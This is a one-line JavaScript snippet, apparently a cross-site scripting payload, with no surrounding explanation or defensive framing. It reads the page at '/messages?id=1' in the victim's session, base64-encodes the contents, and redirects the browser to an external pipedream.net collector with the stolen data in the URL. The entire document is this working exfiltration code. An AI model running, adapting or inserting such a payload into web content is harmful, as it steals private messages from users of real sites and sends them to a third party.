(async()=>{let r=await fetch('/messages?id=1',{cache:'no-store'});let t=await r.text();location.replace('https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t))})();
